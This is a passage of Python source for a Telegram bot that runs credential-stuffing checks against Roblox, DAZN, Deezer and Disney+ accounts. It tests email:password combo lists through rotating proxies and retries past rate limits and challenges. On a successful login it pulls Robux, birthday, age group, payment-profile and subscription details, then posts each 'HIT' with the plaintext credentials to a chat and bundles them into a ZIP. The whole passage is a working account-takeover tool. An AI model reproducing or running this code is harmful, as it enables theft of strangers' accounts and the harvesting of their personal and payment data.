            self._pull("https://apis.roblox.com/credit-balance/v1/get-credit-balance"),
            self._pull(f"https://users.roblox.com/v1/users/{uid}"),
            self._pull(f"https://badges.roblox.com/v1/users/{uid}/badges?limit=10"),
            self._pull(f"https://games.roblox.com/v2/users/{uid}/games?accessFilter=Public&limit=10&sortOrder=Asc"),
            self._pull(f"https://inventory.roblox.com/v2/users/{uid}/inventory/8?limit=100"),
            self._pull(f"https://inventory.roblox.com/v2/users/{uid}/inventory/69?limit=100"),
            self._pull(f"https://accountinformation.roblox.com/v1/users/{uid}/roblox-badges"),
            self._pull("https://apis.roblox.com/payments-gateway/v1/payment-profiles"),
        )

        robux_val = 0
        if isinstance(robux_r, dict):
            robux_val = robux_r.get("robux", 0)
        elif isinstance(robux_r, int):
            robux_val = robux_r

        is_premium = bool(premium_r) if isinstance(premium_r, bool) else False
        prem_exp = "N/A"
        prem_start = "N/A"
        if isinstance(prem_det_r, dict):
            prem_exp = prem_det_r.get("expiration") or "N/A"
            prem_start = prem_det_r.get("subscriptionStartDate") or "N/A"

        cc = "N/A"
        if isinstance(country_r, dict):
            val = country_r.get("value") or {}
            cc = (val.get("countryName") or val.get("localizedName")
                  or country_r.get("countryCode") or "N/A")

        bd = "N/A"
        if isinstance(bday_r, dict) and bday_r.get("birthMonth") and bday_r.get("birthDay") and bday_r.get("birthYear"):
            try:
                bd = f"{int(bday_r['birthYear']):04d}-{int(bday_r['birthMonth']):02d}-{int(bday_r['birthDay']):02d}"
            except Exception:
                bd = "N/A"

        ag = "N/A"
        if isinstance(age_r, dict):
            tk = age_r.get("ageGroupTranslationKey") or ""
            if tk.startswith("Label.AgeGroup"):
                ag = tk[len("Label.AgeGroup"):] or "N/A"
            elif tk:
                ag = tk
            else:
                ag = age_r.get("ageGroup") or "N/A"

        cv = "N/A"
        if isinstance(credit_r, dict):
            cv = credit_r.get("creditBalance") or credit_r.get("balance") or "N/A"
        elif isinstance(credit_r, (int, float)):
            cv = credit_r

        created, description = "N/A", ""
        verified, is_banned = False, False
        if isinstance(user_info_r, dict):
            created = (user_info_r.get("created") or "N/A")[:10]
            description = user_info_r.get("description") or ""
            verified = bool(user_info_r.get("hasVerifiedBadge"))
            is_banned = bool(user_info_r.get("isBanned"))

        rbx_badges = []
        if isinstance(rbx_badges_r, list):
            for b in rbx_badges_r:
                if isinstance(b, dict) and b.get("name"):
                    rbx_badges.append(b["name"])

        badges_count = 0
        if isinstance(badges_r, dict):
            badges_count = badges_r.get("total") or len(badges_r.get("data") or [])

        games_count, games_names = 0, []
        if isinstance(games_r, dict):
            data = games_r.get("data") or []
            games_count = len(data)
            for g in data[:5]:
                if isinstance(g, dict) and g.get("name"):
                    games_names.append(g["name"])

        hats_count, hats_names = 0, []
        if isinstance(hats_r, dict):
            data = hats_r.get("data") or []
            hats_count = hats_r.get("total") or len(data)
            for h in data[:8]:
                if isinstance(h, dict):
                    nm = h.get("assetName") or h.get("name")
                    if nm:
                        hats_names.append(nm)

        bundles_count, bundles_names = 0, []
        if isinstance(bundles_r, dict):
            data = bundles_r.get("data") or []
            bundles_count = bundles_r.get("total") or len(data)
            for b in data[:8]:
                if isinstance(b, dict):
                    nm = b.get("assetName") or b.get("name")
                    if nm:
                        bundles_names.append(nm)

        payments_count = len(payments_r) if isinstance(payments_r, list) else 0

        return {
            "uid": uid, "username": username, "display": display,
            "created": created, "description": description,
            "verified": verified, "banned": is_banned,
            "robux": robux_val if robux_val is not None else 0,
            "premium": is_premium, "premium_expiry": prem_exp, "premium_since": prem_start,
            "country": cc, "birthday": bd, "age_group": ag, "credit": cv,
            "rbx_badges": ",".join(rbx_badges) if rbx_badges else "N/A",
            "badges": badges_count,
            "games": games_count, "games_sample": ",".join(games_names) if games_names else "N/A",
            "hats": hats_count, "hats_sample": ",".join(hats_names) if hats_names else "N/A",
            "bundles": bundles_count, "bundles_sample": ",".join(bundles_names) if bundles_names else "N/A",
            "payments": payments_count,
        }

    def _challenge_type(self, r):
        ctype = (r.headers.get("rblx-challenge-type") or "").lower()
        cid   = r.headers.get("rblx-challenge-id") or ""
        return ctype, cid

    def _parse_400(self, r) -> Dict:
        try:
            data = r.json()
        except Exception:
            data = {}
        low = json.dumps(data).lower()
        if "incorrect" in low or "invalid" in low or "credentials" in low:
            return {"status": "BAD", "reason": "invalid_credentials"}
        if "captcha" in low or "challenge" in low:
            return {"status": "RETRY", "reason": "captcha_on_400"}
        if "locked" in low or "banned" in low:
            return {"status": "LOCKED", "reason": "locked_or_banned"}
        return {"status": "ERROR", "reason": f"http_400:{str(data)[:80]}"}

    async def _on_success(self, r, username_fallback: str) -> Dict:
        try:
            data = r.json()
        except Exception:
            return {"status": "ERROR", "reason": "200_non_json"}
        u = data.get("user")
        if not u:
            return {"status": "ERROR", "reason": f"200_no_user:{str(data)[:80]}"}

        uid   = u.get("id")
        name  = u.get("name") or username_fallback
        disp  = u.get("displayName") or name
        banned = bool(data.get("isBanned"))

        if data.get("twoStepVerificationData"):
            return {"status": "2FA", "uid": uid, "username": name, "display": disp,
                    "email": username_fallback.split(":")[0] if ":" in username_fallback else username_fallback,
                    "reason": "2fa_required"}

        info = await self._enrich(uid, name, disp)
        info["banned"] = banned or info.get("banned", False)

        robux_val  = info.get("robux")
        bundles_v  = info.get("bundles")
        if isinstance(robux_val, int) and robux_val > 0:
            st = "HIT"
        elif info.get("premium"):
            st = "PREMIUM"
        elif isinstance(bundles_v, int) and bundles_v > 0:
            st = "HIT"
        else:
            st = "FREE"
        info["status"] = st
        return {"status": st, "user": info}

    async def run(self, username: str, password: str) -> Dict:
        await self._ensure()
        try:
            await self._warm()
            csrf = await self._fetch_csrf()
            if not csrf:
                return {"status": "ERROR", "reason": "no_csrf"}

            r, err = await self._post_login(username, password)
            if err:
                return {"status": "ERROR", "reason": err}

            if r.status_code == 429:
                return {"status": "RETRY", "reason": "rate_limit"}

            if r.status_code == 200:
                return await self._on_success(r, username)

            if r.status_code == 403:
                ctype, cid = self._challenge_type(r)
                low = (r.text or "").lower()

                if ctype in ("turnstile", "captcha"):
                    return {"status": "RETRY", "reason": f"challenge:{ctype}", "challenge_id": cid}

                sai = await self._sign_sai()
                if not sai:
                    return {"status": "RETRY", "reason": "sai_unavailable", "challenge_id": cid}

                r2, err2 = await self._post_login(username, password, sai=sai)
                if err2:
                    return {"status": "ERROR", "reason": err2}
                if r2.status_code == 429:
                    return {"status": "RETRY", "reason": "rate_limit"}
                if r2.status_code == 200:
                    return await self._on_success(r2, username)
                if r2.status_code == 403:
                    ctype2, cid2 = self._challenge_type(r2)
                    return {"status": "RETRY", "reason": f"sai_challenge:{ctype2 or 'unknown'}",
                            "challenge_id": cid2}
                if r2.status_code == 400:
                    return self._parse_400(r2)
                return {"status": "ERROR", "reason": f"sai_http_{r2.status_code}"}

            if r.status_code == 400:
                return self._parse_400(r)

            return {"status": "ERROR", "reason": f"http_{r.status_code}:{(r.text or '')[:80]}"}
        except Exception as e:
            return {"status": "ERROR", "reason": f"crash:{str(e)[:100]}"}
        finally:
            await self._close()


async def roblox_check_one(email: str, password: str, proxy: Optional[str] = None) -> Dict:
    try:
        from curl_cffi.requests import AsyncSession  # noqa: F401
    except Exception:
        return {"status": "ERROR", "reason": "curl_cffi_missing", "email": email, "password": password}

    checker = _RobloxChecker(proxy=proxy)
    try:
        result = await checker.run(email, password)
    except Exception as e:
        return {"status": "ERROR", "reason": f"runner:{str(e)[:80]}", "email": email, "password": password}

    result.setdefault("email", email)
    result.setdefault("password", password)

    if result.get("status") in ("HIT", "PREMIUM", "FREE"):
        u = result.get("user", {}) or {}
        s = lambda v: "-" if v is None or v == "" else str(v)
        result["content"] = (
            f"{email}:{password} | Status={result.get('status')} | "
            f"UID={s(u.get('uid'))} | Name={s(u.get('username'))} | Display={s(u.get('display'))} | "
            f"Created={s(u.get('created'))} | Verified={u.get('verified')} | Banned={u.get('banned')} | "
            f"Robux={s(u.get('robux'))} | Premium={u.get('premium')} | PremExpiry={s(u.get('premium_expiry'))} | "
            f"Country={s(u.get('country'))} | DOB={s(u.get('birthday'))} | AgeGroup={s(u.get('age_group'))} | "
            f"Credit={s(u.get('credit'))} | Badges={s(u.get('badges'))} | Games={s(u.get('games'))} | "
            f"Hats={s(u.get('hats'))} | Bundles={s(u.get('bundles'))} | Payments={s(u.get('payments'))} | by nyx"
        )
    return result
# ▼ CHUNK 5 END — PASTE CHUNK 6 BELOW THIS LINE ▼


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    DAZN FORMATTERS                                      ║
# ╚══════════════════════════════════════════════════════════════════════════╝

DZ_PREMIUM = _e("6070856180345868814", "🟢")
DZ_FREE    = _e("5123344136665039833", "⚪")
DZ_DEAD    = _e("6100515480735321747", "❌")
DZ_PLAN    = _e("6104891515539033627", "🎫")
DZ_SPORT   = _e("5278712667337409114", "🏆")


def dazn_fmt_hit(r: dict) -> str:
    return (
        f"╔══════════════════════════════╗\n"
        f"║  {DZ_PREMIUM} <b>DAZN PREMIUM HIT</b>        ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email     :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password  :</b> <code>{r.get('password','?')}</code>\n"
        f"{DZ_PLAN}  <b>Plan      :</b> <code>{r.get('plan','N/A')}</code>\n"
        f"{E_COUNTRY}  <b>Country   :</b> <code>{r.get('country','Unknown')}</code>\n"
        f"{E_DATE}  <b>Expiry    :</b> <code>{r.get('expiry','N/A')}</code>\n"
        f"{E_CLOCK}  <b>Days Left :</b> <code>{r.get('days_left',0)}</code>\n"
        f"{E_DATE}  <b>Renewal   :</b> <code>{r.get('renewal','N/A')}</code>\n"
        f"{DZ_SPORT}  <b>Trial     :</b> <code>{'Yes' if r.get('is_trial') else 'No'}</code>\n"
        f"{WH_ICON}  <b>Partner   :</b> <code>{r.get('partner','N/A') or 'N/A'}</code>"
    )


def dazn_fmt_free(r: dict) -> str:
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {DZ_FREE} <b>DAZN FREE</b>             ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email   :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password:</b> <code>{r.get('password','?')}</code>\n"
        f"{E_COUNTRY}  <b>Country :</b> <code>{r.get('country','Unknown')}</code>\n"
        f"{DZ_FREE}  <b>Reason  :</b> <code>{r.get('reason','no_active_subscription')}</code>"
    )


def dazn_fmt_progress(done: int, total: int, hits: int, free: int, bad: int, retry: int, err: int) -> str:
    pct = int(done / total * 100) if total else 0
    bar = _pbar(done, total)
    return (
        f"{E_GEAR} <b>DAZN Checker</b> — Running\n\n"
        f"<code>[{bar}] {pct}%</code>\n"
        f"<b>{done}</b> / <b>{total}</b> checked\n\n"
        f"{DZ_PREMIUM} Hits   : <b>{hits}</b>\n"
        f"{DZ_FREE} Free   : <b>{free}</b>\n"
        f"{SS_DEAD} Bad    : <b>{bad}</b>\n"
        f"{SP_BOLT} Retry  : <b>{retry}</b>\n"
        f"❌ Error  : <b>{err}</b>"
    )


def dazn_fmt_summary(total: int, hits: int, free: int, bad: int, retry: int, err: int, elapsed: float) -> str:
    pct = f"{hits / total * 100:.1f}" if total else "0.0"
    return (
        f"{E_CHECK} <b>DAZN Complete!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_COUNT} Total  : <b>{total}</b>\n"
        f"{DZ_PREMIUM} Hits   : <b>{hits}</b>  (<i>{pct}%</i>)\n"
        f"{DZ_FREE} Free   : <b>{free}</b>\n"
        f"{SS_DEAD} Bad    : <b>{bad}</b>\n"
        f"{SP_BOLT} Retry  : <b>{retry}</b>\n"
        f"❌ Error  : <b>{err}</b>\n"
        f"{E_CLOCK} Time   : <code>{elapsed:.1f}s</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
    )


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    DEEZER FORMATTERS                                    ║
# ╚══════════════════════════════════════════════════════════════════════════╝

DZR_PREMIUM = _e("5296372434692234934", "💚")
DZR_FREE    = _e("5123344136665039833", "⚪")
DZR_MUSIC   = _e("5278712667337409114", "🎵")
DZR_OFFER   = _e("5310278924616356636", "💰")


def deezer_fmt_premium(r: dict) -> str:
    return (
        f"╔══════════════════════════════╗\n"
        f"║  {DZR_PREMIUM} <b>DEEZER PREMIUM HIT</b>      ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email     :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password  :</b> <code>{r.get('password','?')}</code>\n"
        f"{DZR_MUSIC}  <b>Offer     :</b> <code>{r.get('offer','N/A')}</code>\n"
        f"{E_DATE}  <b>Expiry    :</b> <code>{r.get('expiry','N/A')}</code>\n"
        f"{E_CLOCK}  <b>Days Left :</b> <code>{r.get('days_left',0)}</code>\n"
        f"{E_COUNTRY}  <b>Country   :</b> <code>{r.get('country','N/A')}</code>\n"
        f"{DZR_OFFER}  <b>Plan Type :</b> <code>{r.get('plan_type','N/A')}</code>\n"
        f"{HS_USER}  <b>Username  :</b> <code>{r.get('username','N/A')}</code>\n"
        f"{E_ID}  <b>User ID   :</b> <code>{r.get('user_id','N/A')}</code>"
    )


def deezer_fmt_free(r: dict) -> str:
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {DZR_FREE} <b>DEEZER FREE</b>           ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email    :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password :</b> <code>{r.get('password','?')}</code>\n"
        f"{E_COUNTRY}  <b>Country  :</b> <code>{r.get('country','N/A')}</code>\n"
        f"{HS_USER}  <b>Username :</b> <code>{r.get('username','N/A')}</code>"
    )


def deezer_fmt_progress(done: int, total: int, premium: int, free: int, bad: int, retry: int, err: int) -> str:
    pct = int(done / total * 100) if total else 0
    bar = _pbar(done, total)
    return (
        f"{E_GEAR} <b>Deezer Checker</b> — Running\n\n"
        f"<code>[{bar}] {pct}%</code>\n"
        f"<b>{done}</b> / <b>{total}</b> checked\n\n"
        f"{DZR_PREMIUM} Premium : <b>{premium}</b>\n"
        f"{DZR_FREE} Free    : <b>{free}</b>\n"
        f"{SS_DEAD} Bad     : <b>{bad}</b>\n"
        f"{SP_BOLT} Retry   : <b>{retry}</b>\n"
        f"❌ Error   : <b>{err}</b>"
    )


def deezer_fmt_summary(total: int, premium: int, free: int, bad: int, retry: int, err: int, elapsed: float) -> str:
    pct = f"{premium / total * 100:.1f}" if total else "0.0"
    return (
        f"{E_CHECK} <b>Deezer Complete!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_COUNT} Total   : <b>{total}</b>\n"
        f"{DZR_PREMIUM} Premium : <b>{premium}</b>  (<i>{pct}%</i>)\n"
        f"{DZR_FREE} Free    : <b>{free}</b>\n"
        f"{SS_DEAD} Bad     : <b>{bad}</b>\n"
        f"{SP_BOLT} Retry   : <b>{retry}</b>\n"
        f"❌ Error   : <b>{err}</b>\n"
        f"{E_CLOCK} Time    : <code>{elapsed:.1f}s</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
    )


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    DISNEY+ FORMATTERS                                   ║
# ╚══════════════════════════════════════════════════════════════════════════╝

DS_PREMIUM = _e("6070856180345868814", "🟢")
DS_FREE    = _e("5123344136665039833", "⚪")
DS_CASTLE  = _e("4986012398461649574", "🏰")
DS_PLAN    = _e("6104891515539033627", "🎫")
DS_PROFILE = _e("6071202170026332329", "👥")


def disney_fmt_hit(r: dict) -> str:
    profiles = ", ".join(r.get("profiles", [])) if r.get("profiles") else "N/A"
    return (
        f"╔══════════════════════════════╗\n"
        f"║  {DS_PREMIUM} <b>DISNEY+ PREMIUM HIT</b>      ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email     :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password  :</b> <code>{r.get('password','?')}</code>\n"
        f"{DS_PLAN}  <b>Plan      :</b> <code>{r.get('plan','N/A')}</code>\n"
        f"{E_COUNTRY}  <b>Country   :</b> <code>{r.get('country','Unknown')}</code>\n"
        f"{E_DATE}  <b>Expiry    :</b> <code>{r.get('expiry','N/A')}</code>\n"
        f"{E_CLOCK}  <b>Days Left :</b> <code>{r.get('days_left',0)}</code>\n"
        f"{E_DATE}  <b>Renewal   :</b> <code>{r.get('renewal','N/A')}</code>\n"
        f"{DS_PROFILE}  <b>Profiles  :</b> <code>{profiles}</code>\n"
        f"{E_PLAN}  <b>Period    :</b> <code>{r.get('period','N/A') or 'N/A'}</code>\n"
        f"{WH_ICON}  <b>Partner   :</b> <code>{r.get('partner','N/A') or 'N/A'}</code>\n"
        f"{SP_BOLT}  <b>Trial     :</b> <code>{'Yes' if r.get('is_trial') else 'No'}</code>\n"
        f"{E_CHECK}  <b>Verified  :</b> <code>{'Yes' if r.get('email_verified') else 'No'}</code>"
    )


def disney_fmt_free(r: dict) -> str:
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {DS_FREE} <b>DISNEY+ FREE</b>          ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email    :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password :</b> <code>{r.get('password','?')}</code>\n"
        f"{E_COUNTRY}  <b>Country  :</b> <code>{r.get('country','Unknown')}</code>\n"
        f"{DS_FREE}  <b>Reason   :</b> <code>{r.get('reason','no_active_subscription')}</code>"
    )


def disney_fmt_progress(done: int, total: int, hits: int, free: int, bad: int, retry: int, custom: int, err: int) -> str:
    pct = int(done / total * 100) if total else 0
    bar = _pbar(done, total)
    return (
        f"{E_GEAR} <b>Disney+ Checker</b> — Running\n\n"
        f"<code>[{bar}] {pct}%</code>\n"
        f"<b>{done}</b> / <b>{total}</b> checked\n\n"
        f"{DS_PREMIUM} Hits   : <b>{hits}</b>\n"
        f"{DS_FREE} Free   : <b>{free}</b>\n"
        f"{SS_DEAD} Bad    : <b>{bad}</b>\n"
        f"{SP_BOLT} Retry  : <b>{retry}</b>\n"
        f"{CR_RETRY} Custom : <b>{custom}</b>\n"
        f"❌ Error  : <b>{err}</b>"
    )


def disney_fmt_summary(total: int, hits: int, free: int, bad: int, retry: int, custom: int, err: int, elapsed: float) -> str:
    pct = f"{hits / total * 100:.1f}" if total else "0.0"
    return (
        f"{E_CHECK} <b>Disney+ Complete!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_COUNT} Total  : <b>{total}</b>\n"
        f"{DS_PREMIUM} Hits   : <b>{hits}</b>  (<i>{pct}%</i>)\n"
        f"{DS_FREE} Free   : <b>{free}</b>\n"
        f"{SS_DEAD} Bad    : <b>{bad}</b>\n"
        f"{SP_BOLT} Retry  : <b>{retry}</b>\n"
        f"{CR_RETRY} Custom : <b>{custom}</b>\n"
        f"❌ Error  : <b>{err}</b>\n"
        f"{E_CLOCK} Time   : <code>{elapsed:.1f}s</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
    )


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    ROBLOX FORMATTERS                                    ║
# ╚══════════════════════════════════════════════════════════════════════════╝

RB_HIT     = _e("5296372434692234934", "💚")
RB_PREMIUM = _e("6070856180345868814", "🟢")
RB_FREE    = _e("5123344135665039833", "⚪")
RB_LOCKED  = _e("6100515480735321747", "🔒")
RB_2FA     = _e("6102394417258171824", "🔐")
RB_ROBUX   = _e("5310278924616356636", "💰")
RB_GAME    = _e("5278712667337409114", "🎮")


def roblox_fmt_hit(r: dict) -> str:
    u = r.get("user", {}) or {}
    status = r.get("status", "HIT")
    icon = RB_PREMIUM if status == "PREMIUM" else RB_HIT
    title = "ROBLOX PREMIUM" if status == "PREMIUM" else "ROBLOX HIT"
    return (
        f"╔══════════════════════════════╗\n"
        f"║  {icon} <b>{title}</b>          ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email     :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password  :</b> <code>{r.get('password','?')}</code>\n"
        f"{HS_USER}  <b>Username  :</b> <code>{u.get('username','-')}</code>\n"
        f"{HS_USER}  <b>Display   :</b> <code>{u.get('display','-')}</code>\n"
        f"{E_ID}  <b>UID       :</b> <code>{u.get('uid','-')}</code>\n"
        f"{E_DATE}  <b>Created   :</b> <code>{u.get('created','-')}</code>\n"
        f"{RB_ROBUX}  <b>Robux     :</b> <code>{u.get('robux',0)}</code>\n"
        f"{WH_CARD}  <b>Credit    :</b> <code>{u.get('credit','0')}</code>\n"
        f"{RB_PREMIUM}  <b>Premium   :</b> <code>{'Yes' if u.get('premium') else 'No'}</code>\n"
        f"{E_DATE}  <b>PremExpiry:</b> <code>{u.get('premium_expiry','N/A')}</code>\n"
        f"{E_COUNTRY}  <b>Country   :</b> <code>{u.get('country','-')}</code>\n"
        f"{E_DATE}  <b>Birthday  :</b> <code>{u.get('birthday','-')}</code>\n"
        f"{E_ID}  <b>Age Group :</b> <code>{u.get('age_group','-')}</code>\n"
        f"{E_COUNT}  <b>Badges    :</b> <code>{u.get('badges',0)}</code>\n"
        f"{RB_GAME}  <b>Games     :</b> <code>{u.get('games',0)}</code>\n"
        f"{E_COUNT}  <b>Bundles   :</b> <code>{u.get('bundles',0)}</code>\n"
        f"{E_CHECK}  <b>Verified  :</b> <code>{'Yes' if u.get('verified') else 'No'}</code>"
    )


def roblox_fmt_free(r: dict) -> str:
    u = r.get("user", {}) or {}
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {RB_FREE} <b>ROBLOX FREE</b>           ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email    :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password :</b> <code>{r.get('password','?')}</code>\n"
        f"{HS_USER}  <b>Username :</b> <code>{u.get('username','-')}</code>\n"
        f"{E_ID}  <b>UID      :</b> <code>{u.get('uid','-')}</code>\n"
        f"{RB_ROBUX}  <b>Robux    :</b> <code>{u.get('robux',0)}</code>"
    )


def roblox_fmt_2fa(r: dict) -> str:
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {RB_2FA} <b>ROBLOX 2FA</b>             ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email    :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password :</b> <code>{r.get('password','?')}</code>\n"
        f"{E_ID}  <b>UID      :</b> <code>{r.get('uid','-')}</code>\n"
        f"{HS_USER}  <b>Username :</b> <code>{r.get('username','-')}</code>"
    )


def roblox_fmt_progress(done: int, total: int, hit: int, prem: int, free: int, bad: int, twofa: int, locked: int, err: int) -> str:
    pct = int(done / total * 100) if total else 0
    bar = _pbar(done, total)
    return (
        f"{E_GEAR} <b>Roblox Checker</b> — Running\n\n"
        f"<code>[{bar}] {pct}%</code>\n"
        f"<b>{done}</b> / <b>{total}</b> checked\n\n"
        f"{RB_HIT} Hit    : <b>{hit}</b>\n"
        f"{RB_PREMIUM} Premium: <b>{prem}</b>\n"
        f"{RB_FREE} Free   : <b>{free}</b>\n"
        f"{SS_DEAD} Bad    : <b>{bad}</b>\n"
        f"{RB_2FA} 2FA    : <b>{twofa}</b>\n"
        f"{RB_LOCKED} Locked : <b>{locked}</b>\n"
        f"❌ Error  : <b>{err}</b>"
    )


def roblox_fmt_summary(total: int, hit: int, prem: int, free: int, bad: int, twofa: int, locked: int, err: int, elapsed: float) -> str:
    pct = f"{(hit + prem) / total * 100:.1f}" if total else "0.0"
    return (
        f"{E_CHECK} <b>Roblox Complete!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_COUNT} Total   : <b>{total}</b>\n"
        f"{RB_HIT} Hit     : <b>{hit}</b>\n"
        f"{RB_PREMIUM} Premium : <b>{prem}</b>  (<i>{pct}% hit rate</i>)\n"
        f"{RB_FREE} Free    : <b>{free}</b>\n"
        f"{SS_DEAD} Bad     : <b>{bad}</b>\n"
        f"{RB_2FA} 2FA     : <b>{twofa}</b>\n"
        f"{RB_LOCKED} Locked  : <b>{locked}</b>\n"
        f"❌ Error   : <b>{err}</b>\n"
        f"{E_CLOCK} Time    : <code>{elapsed:.1f}s</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
    )
# ▼ CHUNK 6 END — PASTE CHUNK 7 BELOW THIS LINE ▼


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    DAZN RUNNER                                          ║
# ╚══════════════════════════════════════════════════════════════════════════╝

async def _run_dazn(uid, chat_id, total, combos, status_msg, bot: Bot):
    hits, free, bad, retry, err = [], [], [], [], []
    processed = last_edit = 0.0
    start_t = time.time()
    proxy_mgr = PROXY_MANAGER

    for combo in combos:
        if ":" not in combo:
            bad.append({"status": "BAD", "reason": "malformed", "email": combo, "password": ""})
            processed += 1
            continue
        email, password = combo.split(":", 1)
        email, password = email.strip(), password.strip()
        if not email or not password:
            bad.append({"status": "BAD", "reason": "empty", "email": email, "password": password})
            processed += 1
            continue

        proxy = await proxy_mgr.get_verified_proxy_for("dazn") if proxy_mgr else None
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, dazn_check_one, email, password, proxy)

        s = result.get("status")
        if s == "HIT":
            hits.append(result)
            if proxy:
                proxy_mgr.mark_success(proxy)
            await bot.send_message(chat_id, dazn_fmt_hit(result), parse_mode="HTML")
        elif s == "FREE":
            free.append(result)
            if proxy:
                proxy_mgr.mark_success(proxy)
            await bot.send_message(chat_id, dazn_fmt_free(result), parse_mode="HTML")
        elif s == "RETRY":
            retry.append(result)
            if proxy:
                proxy_mgr.mark_failed(proxy)
        elif s == "BAD":
            bad.append(result)
        else:
            err.append(result)
            if proxy:
                proxy_mgr.mark_failed(proxy)

        processed += 1
        if total > 1:
            now = time.monotonic()
            if now - last_edit >= 2.0:
                last_edit = now
                await safe_edit(status_msg, dazn_fmt_progress(
                    processed, total, len(hits), len(free), len(bad), len(retry), len(err)))

    elapsed = time.time() - start_t
    user_results[uid].update({
        "dazn_hit": hits, "dazn_free": free, "dazn_bad": bad,
        "dazn_retry": retry, "dazn_error": err,
        "dazn_total": total, "processing": False,
    })
    if GC_STORE_CHAT_ID and hits:
        await _gc_store_dazn(bot, hits, uid)
    await safe_edit(status_msg, dazn_fmt_summary(
        total, len(hits), len(free), len(bad), len(retry), len(err), elapsed),
        markup=main_markup("dazn"))


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    DEEZER RUNNER                                        ║
# ╚══════════════════════════════════════════════════════════════════════════╝

async def _run_deezer(uid, chat_id, total, combos, status_msg, bot: Bot):
    premium, free, bad, retry, err = [], [], [], [], []
    processed = last_edit = 0.0
    start_t = time.time()
    proxy_mgr = PROXY_MANAGER

    for combo in combos:
        if ":" not in combo:
            bad.append({"status": "BAD", "reason": "malformed", "email": combo, "password": ""})
            processed += 1
            continue
        email, password = combo.split(":", 1)
        email, password = email.strip(), password.strip()
        if not email or not password:
            bad.append({"status": "BAD", "reason": "empty", "email": email, "password": password})
            processed += 1
            continue

        proxy = await proxy_mgr.get_verified_proxy_for("deezer") if proxy_mgr else None
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, deezer_check_one, email, password, proxy)

        s = result.get("status")
        if s == "PREMIUM":
            premium.append(result)
            if proxy:
                proxy_mgr.mark_success(proxy)
            await bot.send_message(chat_id, deezer_fmt_premium(result), parse_mode="HTML")
        elif s == "FREE":
            free.append(result)
            if proxy:
                proxy_mgr.mark_success(proxy)
            await bot.send_message(chat_id, deezer_fmt_free(result), parse_mode="HTML")
        elif s == "RETRY":
            retry.append(result)
            if proxy:
                proxy_mgr.mark_failed(proxy)
        elif s == "BAD":
            bad.append(result)
        else:
            err.append(result)
            if proxy:
                proxy_mgr.mark_failed(proxy)

        processed += 1
        if total > 1:
            now = time.monotonic()
            if now - last_edit >= 2.0:
                last_edit = now
                await safe_edit(status_msg, deezer_fmt_progress(
                    processed, total, len(premium), len(free), len(bad), len(retry), len(err)))

    elapsed = time.time() - start_t
    user_results[uid].update({
        "deezer_premium": premium, "deezer_free": free, "deezer_bad": bad,
        "deezer_retry": retry, "deezer_error": err,
        "deezer_total": total, "processing": False,
    })
    if GC_STORE_CHAT_ID and premium:
        await _gc_store_deezer(bot, premium, uid)
    await safe_edit(status_msg, deezer_fmt_summary(
        total, len(premium), len(free), len(bad), len(retry), len(err), elapsed),
        markup=main_markup("deezer"))


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    DISNEY+ RUNNER                                       ║
# ╚══════════════════════════════════════════════════════════════════════════╝

async def _run_disney(uid, chat_id, total, combos, status_msg, bot: Bot):
    hits, free, bad, retry, custom, err = [], [], [], [], [], []
    processed = last_edit = 0.0
    start_t = time.time()
    proxy_mgr = PROXY_MANAGER

    for combo in combos:
        if ":" not in combo:
            bad.append({"status": "BAD", "reason": "malformed", "email": combo, "password": ""})
            processed += 1
            continue
        email, password = combo.split(":", 1)
        email, password = email.strip(), password.strip()
        if not email or not password:
            bad.append({"status": "BAD", "reason": "empty", "email": email, "password": password})
            processed += 1
            continue

